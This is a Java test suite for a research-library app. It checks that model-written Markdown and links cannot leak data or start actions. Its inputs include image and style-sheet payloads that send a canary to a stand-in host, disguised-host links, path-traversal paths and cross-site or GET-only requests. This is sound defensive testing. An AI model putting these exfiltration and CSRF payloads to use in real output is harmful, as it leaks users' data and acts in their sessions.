package org.researchzosho.librarian;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.researchzosho.Config;

import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.time.Duration;
import java.time.Instant;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * What a model's words become in a file for another program and on the library's pages, after the regression checks of 0.8.1
 * ({@link GuardChecksPagesTest}): the same mechanisms, tried with other inputs. Each test says what must not happen and, beside it,
 * what an ordinary report or an ordinary reader does that must go on working.
 */
class GuardFixesPagesTest {
    static final ObjectMapper M = new ObjectMapper();
    static final String CANARY = "QX7731MOOR", EVIL = "https://collector.example.net";

    @TempDir Path tmp;
    String home;
    LibraryStore store;

    @BeforeEach void up() throws Exception {
        home = System.getProperty("user.home"); System.setProperty("user.home", tmp.resolve("home").toString()); Config.invalidate();
        store = new LibraryStore(tmp.resolve("lib")); store.init();
    }

    @AfterEach void down() { System.setProperty("user.home", home); Config.invalidate(); }

    static ObjectNode message(String role, String content) { ObjectNode m = M.createObjectNode(); m.put("role", role); m.put("content", content); m.put("at", 1L); return m; }

    // ---- 4. a file written for another program

    /**
     * Nothing in the export decides what is code, so a picture or a tag is made harmless wherever it stands. Other ways of standing
     * beside code than the check tried, read by the check's own reader of Markdown; and what an ordinary report holds, which stays.
     */
    @Test
    void aPictureOrATagIsHarmlessWhereverItStandsAndAnOrdinaryReportIsUnchanged() {
        String picture = "![s](" + EVIL + "/p.png?d=" + CANARY + ")", tag = "<img src=\"" + EVIL + "/t.png?d=" + CANARY + "\">";
        Map<String, String> ways = new LinkedHashMap<>();
        ways.put("after a tilde fence of five that holds a line of four", "~~~~~\n~~~~\n~~~~~\n\n%s\n");
        ways.put("after a fence three spaces in, closed by a longer one", "   ```\n   x\n   `````\n\n%s\n");
        ways.put("after an ordered list item whose fence is not closed", "1. the call:\n\n   ~~~\n   x\n\n%s\n");
        ways.put("between a run of three backticks and a run of one", "``` %s `\n");
        ways.put("after a span of two backticks closed on the next line", "``a\nb`` %s\n");
        ways.put("after a tab-indented line of backticks", "The call:\n\n\t```\n\n%s\n");
        ways.put("a tag broken over two lines", "x\n\n<img\nsrc=\"" + EVIL + "/broken.png?d=" + CANARY + "\">\n");
        ways.put("a style sheet", "<style>body{background:url(" + EVIL + "/style.png?d=" + CANARY + ")}</style>\n");
        ways.put("a picture by a reference defined in a fence that is none", "``` a`b\n![s][r]\n\n[r]: " + EVIL + "/ref.png?d=" + CANARY + "\n");
        List<String> drawn = new ArrayList<>();
        int tried = 0;
        for (Map.Entry<String, String> way : ways.entrySet()) for (String thing : way.getValue().contains("%s") ? List.of(picture, tag) : List.of("")) {
            String written = "## Answer\n\nIn 1952.\n\n" + (way.getValue().contains("%s") ? String.format(way.getValue(), thing) : way.getValue());
            tried++;
            boolean before = written.contains("<style>") || GuardChecksPagesTest.drawnByCommonMark(written).stream().anyMatch(d -> d.contains(CANARY));
            assertTrue(before, "as written, a reader by the specification draws it or reads it as markup (the control): " + way.getKey());
            String after = Export.forAViewer(written);
            if (GuardChecksPagesTest.drawnByCommonMark(after).stream().anyMatch(d -> d.contains(CANARY)) || after.contains("<style") || after.contains("<img")) drawn.add(way.getKey());
        }
        System.out.println("[fix] 4 Markdown for another program, " + tried + " more ways of writing a picture or a tag: still drawn or read as markup in " + drawn.size() + " " + drawn);
        assertEquals(List.of(), drawn);
        // what a browser reads as a tag though the Markdown rules do not: a slash where the space would be, a tag no bracket closes before the file ends
        assertEquals("&lt;img/src=\"" + EVIL + "/x.png\"> and &lt;img src", Export.forAViewer("<img/src=\"" + EVIL + "/x.png\"> and <img src"));
        // what an ordinary report holds comes out as it went in: prose, a table with line breaks, the library's own picture, code with brackets and comparisons, a link, a quoted address
        String ordinary = "## Answer\n\nIn 1952 <sup>1</sup>.\n\n| year | note |\n|---|---|\n| 1952 | first<br>crossing |\n\n![The ferry [1]](/images/ferry-1952.png)\n\n"
                + "```java\nMap<String, List<String>> m = new HashMap<>();\nif (a < b && c > d) return x<y;\n#include <stdio.h>\n```\n\nSee [the gazette](https://example.org/gazette) and <details><summary>more</summary>text</details>.\n";
        assertEquals(ordinary, Export.forAViewer(ordinary), "an ordinary report is written out unchanged");
        // the cost, said in the method's own words: in a sample of code a picture's mark and a tag with a value are written harmless too
        assertEquals("```\n[s](https://example.org/a.png) and &lt;a href=\"https://example.org\">x</a>\n```", Export.forAViewer("```\n![s](https://example.org/a.png) and <a href=\"https://example.org\">x</a>\n```"));
        assertEquals("![kept](/images/kept.png) and [![kept](/images/kept.png)](" + EVIL + "/x)", Export.forAViewer("![kept](/images/kept.png) and ![![kept](/images/kept.png)](" + EVIL + "/x)"), "the library's own picture stays a picture, alone and inside a picture of the web");
    }

    // ---- 9. the pages

    /** A link on a report's page says where it leads when its words do not, whatever the address is dressed as; and says nothing twice. */
    @Test
    void aLinkOnAReportsPageSaysItsHostUnlessItsWordsAlreadyDo() {
        Map<String, String> hidden = new LinkedHashMap<>();
        hidden.put("a name before an @, which is not the host", "[the article](https://en.wikipedia.org@collector.example.net/x?d=" + CANARY + ")");
        hidden.put("words that hold a longer name ending like the host", "[see notcollector.example.net](" + EVIL + "/x?d=" + CANARY + ")");
        hidden.put("words that hold the host as the beginning of another", "[collector.example.net.example.org](" + EVIL + "/x?d=" + CANARY + ")");
        hidden.put("a port after the host", "[the tide tables](https://collector.example.net:8443/x?d=" + CANARY + ")");
        for (Map.Entry<String, String> f : hidden.entrySet()) {
            String page = Pages.md("## Answer\n\nSee " + f.getValue() + " for it.\n");
            assertTrue(page.contains("<span class=\"k leads\">(collector.example.net)</span>"), f.getKey() + ": " + page);
        }
        String shown = Pages.md("## Sources\n\n1. [collector.example.net: the tide tables](" + EVIL + "/tables) and [" + EVIL + "/tables](" + EVIL + "/tables) and [The Gazette (COLLECTOR.example.net)](" + EVIL + "/g)\n");
        assertFalse(shown.contains("class=\"k leads\""), "a link whose words name its host is not said twice: " + shown);
        String own = Pages.md("See [the report](/entry/I-0001-kestrel) and [[F-0001-ferry]].\n");
        assertTrue(own.contains("<a href=\"/entry/I-0001-kestrel\">the report</a>") && !own.contains("leads"), "a link to a page of this library is as it was: " + own);
    }

    /**
     * An address written alone in a sentence is a link that ends where the address does: the sentence's mark after it (a colon, a full
     * stop, a comma, a question mark, a closing quote) stays text after the link, as the address is read in a person's words. On a
     * report of 0.8.1's acceptance pass the citation check's line "not supported by https://…/article/240471: The …" was a link to
     * ".../240471:". The controls: an address with no mark after it is the same link as before; an address whose own last character
     * is such a mark keeps it inside a Markdown link, which is written as it is meant; a mark inside an address stays in it.
     */
    @Test
    void aSentencesMarkAfterAnAddressIsNotPartOfItsLink() {
        String a = "https://journal.example.org/int/archive/article/240471";
        Map<String, String> written = new LinkedHashMap<>();
        written.put("not supported by " + a + ": The ferry ran until 1968.", "not supported by <a href=\"" + a + "\" rel=\"noreferrer\">" + a + "</a>: The ferry ran until 1968.");
        written.put("See " + a + ".", "See <a href=\"" + a + "\" rel=\"noreferrer\">" + a + "</a>.");
        written.put("Was it " + a + "?", "Was it <a href=\"" + a + "\" rel=\"noreferrer\">" + a + "</a>?");
        written.put("Both " + a + ", and more.", "Both <a href=\"" + a + "\" rel=\"noreferrer\">" + a + "</a>, and more.");
        written.put("It said \"" + a + "\".", "It said &quot;<a href=\"" + a + "\" rel=\"noreferrer\">" + a + "</a>&quot;.");
        written.put("It said “" + a + "”.", "It said “<a href=\"" + a + "\" rel=\"noreferrer\">" + a + "</a>”.");
        written.put("Read " + a + "?page=2&lang=en: it says so.", "Read <a href=\"" + a + "?page=2&amp;lang=en\" rel=\"noreferrer\">" + a + "?page=2&amp;lang=en</a>: it says so.");
        // the controls
        written.put("The page " + a + " says so", "The page <a href=\"" + a + "\" rel=\"noreferrer\">" + a + "</a> says so");
        written.put("The page https://journal.example.org:8443/a:b;c says so", "The page <a href=\"https://journal.example.org:8443/a:b;c\" rel=\"noreferrer\">https://journal.example.org:8443/a:b;c</a> says so");
        written.put("[the ratio](https://journal.example.org/wiki/1:2.)", "<a href=\"https://journal.example.org/wiki/1:2.\" rel=\"noreferrer\">the ratio</a> <span class=\"k leads\">(journal.example.org)</span>");
        Map<String, String> made = new LinkedHashMap<>();
        for (String w : written.keySet()) made.put(w, Pages.inline(w));
        System.out.println("[fix] 9 a sentence's mark after an address, on a page: " + made);
        assertEquals(written, made);
    }

    /** Which paths written as a picture's are drawn: a kept picture's and no other, however a path is dressed to climb out of the pictures' folder. */
    @Test
    void onlyAKeptPicturesPathIsDrawnAsAPicture() throws Exception {
        for (String kept : List.of("/images/ferry-1952.png", "/images/collections/J-0007/small-3.jpg", "/images/%E5%86%99%E7%9C%9F.jpg"))
            assertTrue(Pages.keptPicturePath(kept), kept);
        List<String> pages = List.of("/logout", "/?lang=ja", "/dossier?subject=X&in=ja", "/images", "/images/", "/images/../logout", "/images/%2e%2e/logout", "/images/%2E./logout", "/images/a.png?in=ja", "/images/a/b.png",
                "/images/collections/../x.png", "/found?u=https%3A%2F%2Fcollector.example.net%2Fx.png", "/exports/report.pdf", "/explain?term=ferry", "/entry/I-0001?in=ja", "/images\\x.png");
        for (String p : pages) assertFalse(Pages.keptPicturePath(p), p);
        StringBuilder reply = new StringBuilder("They say this.\n\n![kept](/images/kept.png)\n\n");
        for (String p : pages) if (!p.contains("\\")) reply.append("![a](").append(p).append(") ");
        Librarian.Session s = Librarian.Session.open(store);
        s.append(message("user", "What do my notes say?")); s.append(message("assistant", reply.toString()));
        String chat = Pages.transcript(store, s, 100), report = Pages.md("## Answer\n\n" + reply + "\n\n![fig](/logout)\n");
        assertEquals(List.of(), GuardChecksPagesTest.loadsFromTheLibrary(chat), "the chat's page loads nothing of the library but its pictures: " + chat);
        assertEquals(List.of(), GuardChecksPagesTest.loadsFromTheLibrary(report), "nor does a report's page: " + report);
        assertTrue(chat.contains("src=\"/images/kept.png\"") && report.contains("src=\"/images/kept.png\""), "a kept picture is drawn on both (the control)");
        assertTrue(chat.contains("![a](/logout)") && report.contains("![a](/logout)"), "what is no picture's path is left as the words it is: " + chat);
    }

    /**
     * A link a model wrote that leads into this library. The pages that start work when they are opened (a question put to other
     * libraries, a search for pictures, a reading by the model, a question sharpened) are the library's own pages' to link to; in
     * a model's words such an address stays words, written as a path, with this machine's address before it, or with the library's
     * own name: from its settings, and as the browser of the request sees it. The control: a link to a held report, a run's page,
     * a kept picture and an exported file is a link, and so is a link of the web.
     */
    @Test
    void aLinkAModelWroteIntoThisLibraryIsALinkOnlyToWhatIsHeldForReading() throws Exception {
        String n = Long.toHexString(System.nanoTime()), name = "library-" + n + ".example.org", seen = "shelf-" + n + ".example.org";
        Config.set("RESEARCHZOSHO_SHARE_ADDRESS", "https://" + name);
        List<String> starts = List.of("/ask?q=the+door+code+is+" + CANARY, "/images?q=" + CANARY, "/explain?term=" + CANARY + "&in=ja", "/research?sharpen=" + CANARY, "/?lang=ja", "/logout", "/dossier?subject=" + CANARY, "/chat?session=C-1", "/settings", "/entry/I-0001?in=ja");
        List<String> hosts = List.of("", "http://127.0.0.1:4649", "http://localhost:4649", "http://[::1]:4649", "http://0.0.0.0:4649", "http://2130706433:4649", "http://LOCALHOST.:4649", "https://" + name, "https://user@" + name + ":8443", "http://" + seen + ":4649");
        List<String> drawn = new ArrayList<>();
        int written = 0;
        Pages.HERE.set(seen + ":4649");   // the name this request's browser used for the library
        try {
            for (String host : hosts) for (String path : starts) {
                String address = host + path;
                for (String form : List.of("See [the harbour office's page](" + address + ") for it.", "See ![the ferry](" + address + ") for it.", host.isEmpty() ? "" : "See " + address + " for it.", "A reading says so [" + (host.isEmpty() ? "http://127.0.0.1:4649" : host) + path + "].")) {
                    if (form.isEmpty()) continue;
                    written++;
                    String page = form.startsWith("A reading") ? Pages.readingHtml(form) : Pages.md("## Answer\n\n" + form + "\n");
                    if (!GuardChecksPagesTest.leadsTo(page).isEmpty() || page.contains("<img")) drawn.add(form);
                    Librarian.Session s = Librarian.Session.open(store);
                    s.append(message("user", "What do my notes say?")); s.append(message("assistant", form));
                    String chat = Pages.transcript(store, s, 100);
                    String reply = chat.substring(Math.max(0, chat.indexOf("What do my notes say?")));
                    if (!GuardChecksPagesTest.leadsTo(reply).stream().filter(a -> a.contains(CANARY) || a.contains("lang=") || a.contains("logout") || a.contains("settings") || a.contains("session=")).toList().isEmpty() || reply.contains("<img")) drawn.add("in the chat: " + form);
                }
                written++;
                if (!Pages.locatorLink(host.isEmpty() ? "http://127.0.0.1:4649" + path : address).equals(Pages.esc(host.isEmpty() ? "http://127.0.0.1:4649" + path : address))) drawn.add("as a claim's source: " + address);
            }
            // what the library holds for reading is linked to, and so is the web
            String held = Pages.md("See [the report](/entry/I-0001-kestrel-crossing), [its run](/jobs/J-0007), [the file](/exports/I-0001-kestrel-crossing.pdf), [where it says so](/entry/I-0001-kestrel-crossing#answer), ![kept](/images/kept.png), [the gazette](https://gazette.example.org/1968) and https://example.org/tides and [[F-0001-ferry]].\n");
            assertEquals(List.of("/entry/I-0001-kestrel-crossing", "/jobs/J-0007", "/exports/I-0001-kestrel-crossing.pdf", "/entry/I-0001-kestrel-crossing#answer", "https://gazette.example.org/1968", "https://example.org/tides", "/entry/F-0001-ferry"), GuardChecksPagesTest.leadsTo(held), held);
            assertTrue(held.contains("<img class=\"thumb\" src=\"/images/kept.png\""), held);
            for (String climbs : List.of("/entry/../ask?q=x", "/entry/%2e%2e/logout", "/entry/I-0001/../../logout", "/jobs/J-0007?stop=1", "/jobs/../settings", "/exports/..", "//" + name + "/entry/I-0001", "/entry/"))
                assertFalse(Pages.heldForReading(climbs), climbs);
            // the program's own documentation says where the library is, and that address is a link there
            assertTrue(GuardChecksPagesTest.leadsTo(Pages.mdOfTheProgram("Open http://localhost:4649 in a browser.\n")).contains("http://localhost:4649"));
            // a form or a button is not a model's to write: its words are escaped before the page adds its own tags
            String tags = Pages.md("<form method=\"post\" action=\"/logout\"><button>Read more</button></form> and <a href=\"/ask?q=" + CANARY + "\">notes</a>\n");
            assertTrue(tags.contains("&lt;form") && !tags.contains("<form") && !tags.contains("<button") && GuardChecksPagesTest.leadsTo(tags).isEmpty(), tags);
        } finally { Pages.HERE.remove(); }   // the setting was written in this test's own home, which goes with it
        System.out.println("[fix] 9 links a model wrote into this library, " + written + " written (" + starts.size() + " pages that start work or change something, " + hosts.size() + " ways of naming the library, as a link, a picture, a bare address, a reading's cite and a claim's source): links or pictures drawn " + drawn.size() + " " + drawn.stream().limit(6).toList());
        assertEquals(List.of(), drawn);
    }

    /**
     * Stops the daemon and waits, for at most thirty seconds, until no run of it is still at work. A run filed by a press of a
     * button goes on after the page has answered, and a stop gives each worker three seconds to end; a worker that took longer on
     * a busy machine was still writing into the library while the test's folder was being taken away, and the removal failed (the
     * Mac's suite in 0.8.1's release checks, in the test of the translate button).
     */
    static void stopped(LibrarianDaemon d) {
        d.stop();
        long end = System.currentTimeMillis() + 30_000;
        try { while (!d.jobs().running().isEmpty() && System.currentTimeMillis() < end) Thread.sleep(50); }
        catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }

    static HttpResponse<String> ask(String method, String url, String body, String... headers) throws Exception {
        HttpRequest.Builder b = HttpRequest.newBuilder(URI.create(url)).timeout(Duration.ofSeconds(60));
        if (method.equals("POST")) b.header("Content-Type", "application/x-www-form-urlencoded").POST(HttpRequest.BodyPublishers.ofString(body == null ? "" : body)); else b.GET();
        for (int i = 0; i + 1 < headers.length; i += 2) b.header(headers[i], headers[i + 1]);
        return HttpClient.newBuilder().followRedirects(HttpClient.Redirect.NEVER).build().send(b.build(), HttpResponse.BodyHandlers.ofString());
    }

    static List<String> cookiesSet(HttpResponse<String> r) { return r.headers().allValues("Set-Cookie").stream().map(c -> c.contains(";") ? c.substring(0, c.indexOf(';')) : c).toList(); }

    /**
     * What used to act on an address alone now acts only on the page's own form: signing out, keeping a language, filing a
     * translation of a dossier or of a report. Each is asked the old way (a link followed, with the reader's cookie) and does
     * nothing; each is asked by the page's form and does it; and the same form from another site is refused. A request a tag makes
     * by itself for a page is answered with no page at all.
     */
    @Test
    void anAddressAloneChangesNothingAndThePagesOwnFormDoes() throws Exception {
        Boolean signIn = WebAccess.OVERRIDE, local = WebAccess.LOCAL_OVERRIDE;
        WebAccess.OVERRIDE = true; WebAccess.LOCAL_OVERRIDE = false;
        Patrons.setDefault(store, Patrons.Level.deny);
        Patrons.set(store, "did:key:owner", "Owner", Patrons.Level.write);
        Invites.Invite invite = Invites.make(store, "Ann Example", Patrons.Level.write);
        store.write(new Investigation("I-0001-kestrel-crossing", "The Kestrel crossing", Finding.State.accepted, "model:stand-in", Instant.now().toString(), List.of(), List.of(), "## Question\n\nWhen?\n\n## Answer\n\nIn 1952.\n"));
        new LibrarianIndex(store, Embeddings.none()).rebuild();
        LibrarianDaemon d = LibrarianDaemon.start(store, "127.0.0.1", 0, "http://127.0.0.1:1", "none", -1);
        String base = "http://127.0.0.1:" + d.port();
        try {
            HttpResponse<String> joined = ask("POST", base + "/join", "code=" + invite.code() + "&password=ann-secret-1&again=ann-secret-1");
            String cookie = null;
            for (String c : cookiesSet(joined)) if (c.startsWith(Pages.COOKIE + "=")) cookie = c;
            assertTrue(cookie != null, "the person is signed in: " + joined.statusCode());
            String[] as = {"Cookie", cookie, "Sec-Fetch-Site", "same-origin", "Sec-Fetch-Mode", "navigate", "Sec-Fetch-Dest", "document"};
            String home = ask("GET", base + "/", null, as).body();
            assertTrue(home.contains("Ann Example"), "and the cookie opens the home page by name (the control)");
            assertTrue(home.contains("<form class=\"inline as-link\" method=\"post\" action=\"/logout\">") && home.contains("action=\"/lang\"") && !home.contains("href=\"/logout\""), "the page's own sign-out and language switch are forms");
            Map<String, String> did = new LinkedHashMap<>();
            int runs = GuardChecksPagesTest.jobs(base, cookie);
            // the old way: an address alone
            HttpResponse<String> out = ask("GET", base + "/logout", null, as);
            did.put("GET /logout", out.statusCode() + " " + cookiesSet(out) + (ask("GET", base + "/", null, as).body().contains("Ann Example") ? " still signed in" : " SIGNED OUT"));
            HttpResponse<String> lang = ask("GET", base + "/?lang=ja", null, as);
            did.put("GET /?lang=ja", lang.statusCode() + " " + cookiesSet(lang) + (lang.body().contains("lang=\"ja\"") ? " shown in ja" : " not in ja"));
            ask("GET", base + "/dossier?subject=Kestrel+Sound&in=ja", null, as);
            ask("GET", base + "/entry/I-0001-kestrel-crossing?in=ja", null, as);
            did.put("GET a dossier and a report with in=ja", (GuardChecksPagesTest.jobs(base, cookie) - runs) + " run(s) filed");
            // a tag's own request for a page: no page, nothing done
            HttpResponse<String> asPicture = ask("GET", base + "/dossier?subject=Kestrel+Sound&in=ja", null, "Cookie", cookie, "Sec-Fetch-Site", "same-origin", "Sec-Fetch-Mode", "no-cors", "Sec-Fetch-Dest", "image");
            did.put("a picture's request for a page", asPicture.statusCode() + (asPicture.body().contains("Kestrel") ? " the page" : " no page"));
            assertEquals("{GET /logout=200 [] still signed in, GET /?lang=ja=200 [] shown in ja, GET a dossier and a report with in=ja=0 run(s) filed, a picture's request for a page=404 no page}", did.toString());
            // the form from another site, as a browser sends it: refused, nothing done
            String[] elsewhere = {"Cookie", cookie, "Sec-Fetch-Site", "cross-site", "Origin", "https://collector.example.net"};
            assertEquals(403, ask("POST", base + "/logout", "", elsewhere).statusCode());
            assertEquals(403, ask("POST", base + "/lang", "lang=ja&back=/", elsewhere).statusCode());
            assertEquals(403, ask("POST", base + "/dossier", "subject=Kestrel+Sound&in=ja&translate=1", elsewhere).statusCode());
            assertTrue(ask("GET", base + "/", null, as).body().contains("Ann Example") && GuardChecksPagesTest.jobs(base, cookie) == runs, "another site's forms did nothing");
            // the page's own forms do each thing
            String[] own = {"Cookie", cookie, "Sec-Fetch-Site", "same-origin", "Origin", base};
            HttpResponse<String> kept = ask("POST", base + "/lang", "lang=ja&back=" + URLEncoder.encode("/past?kind=report", StandardCharsets.UTF_8), own);
            assertTrue(kept.statusCode() == 303 && cookiesSet(kept).contains(Chrome.COOKIE + "=ja") && kept.headers().firstValue("Location").orElse("").equals("/past?kind=report"), "the language is kept and the page comes back: " + kept.statusCode() + " " + kept.headers().map());
            assertEquals("/", ask("POST", base + "/lang", "lang=ja&back=" + URLEncoder.encode("//collector.example.net/x", StandardCharsets.UTF_8), own).headers().firstValue("Location").orElse(""), "a way back that is no path of the library is the home page");
            ask("POST", base + "/dossier", "subject=Kestrel+Sound&in=ja&translate=1", own);
            ask("POST", base + "/entry/I-0001-kestrel-crossing", "in=ja&translate=1", own);
            assertEquals(2, GuardChecksPagesTest.jobs(base, cookie) - runs, "each translation is filed by its page's button");
            HttpResponse<String> signedOut = ask("POST", base + "/logout", "", own);
            assertTrue(signedOut.statusCode() == 303 && !ask("GET", base + "/", null, as).body().contains("Ann Example"), "and the page's own form signs out");
            // what holds the forms to the library's own pages: the page's policy lets a form go nowhere else, and the session's cookie is not sent with another site's requests for a part of a page
            HttpResponse<String> page = ask("GET", base + "/login", null);
            assertTrue(page.headers().firstValue("Content-Security-Policy").orElse("").contains("form-action 'self'"), page.headers().map().toString());
            assertTrue(joined.headers().allValues("Set-Cookie").stream().anyMatch(c -> c.startsWith(Pages.COOKIE + "=") && c.contains("SameSite=Lax") && c.contains("HttpOnly")), "the session's cookie: " + joined.headers().allValues("Set-Cookie"));
            System.out.println("[fix] 9 what an address alone did, and does now: " + did);
        } finally { stopped(d); WebAccess.OVERRIDE = signIn; WebAccess.LOCAL_OVERRIDE = local; }
    }
}
